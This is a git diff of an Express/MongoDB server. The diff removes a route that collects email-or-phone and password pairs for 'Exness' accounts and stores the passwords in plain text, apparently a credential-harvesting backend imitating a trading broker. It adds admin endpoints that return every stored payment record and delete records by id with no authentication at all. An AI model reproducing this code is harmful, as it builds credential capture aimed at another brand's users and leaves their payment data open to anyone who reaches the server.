@@ -3,9 +3,8 @@ const express = require('express');
 const path = require('path');
 const mongoose = require('mongoose');
 const session = require('express-session');
+const Details = require("./models/Details");
 
-// Corrected path for paymentRoutes
-const paymentRoutes = require('./routes/paymentRoutes'); 
 
 const app = express(); // Initialize app instance
 
@@ -14,9 +13,7 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true })); 
 
 
-// Import routes
-const exnessuserRoutes = require('./routes/exnessuserRoutes');
-app.use('/', exnessuserRoutes); 
+ 
 
 // Middleware
 app.set('view engine', 'ejs'); 
@@ -35,35 +32,35 @@ mongoose.connect(process.env.MONGO_URI)
   .then(() => console.log('MongoDB connected!'))
   .catch((err) => console.error('MongoDB connection error:', err));
 
-// Use payment routes
-app.use('/api', paymentRoutes);
 
 // Routes
 const indexRoutes = require('./routes/index');
 app.use('/', indexRoutes);
 
-// POST route to handle form submission
-app.post('/submit-exness-details', (req, res) => {
-    const { emailOrNumber, password } = req.body;
 
-    if (!emailOrNumber || !password) {
-        return res.status(400).send("Missing required fields.");
-    }
-
-    const newExnessUser = new Exnessuser({
-        email: emailOrNumber,
-        password: password,   
-    });
-
-    newExnessUser.save()
-        .then(() => {
-            res.send("Exness user saved successfully.");
-        })
-        .catch((err) => {
-            console.error("Error saving Exness user:", err);
-            res.status(500).send("Error saving Exness user: " + err.message);
-        });
+app.get("/admin/data", async (req, res) => {
+  try {
+      const payments = await Details.find(); // Fetch all details
+      res.json(payments); // Send as JSON
+  } catch (error) {
+      console.error("Error fetching payments:", error);
+      res.status(500).json({ message: "Failed to fetch payment data." });
+  }
 });
+
+app.delete("/admin/delete/:id", async (req, res) => {
+  try {
+      const { id } = req.params;
+      await Details.findByIdAndDelete(id);
+      res.status(200).json({ message: "Payment detail deleted successfully." });
+  } catch (error) {
+      console.error("Error deleting payment:", error);
+      res.status(500).json({ message: "Failed to delete payment detail." });
+  }
+});
+
+
+
 
 // Start the server
 const PORT = process.env.PORT || 3000;
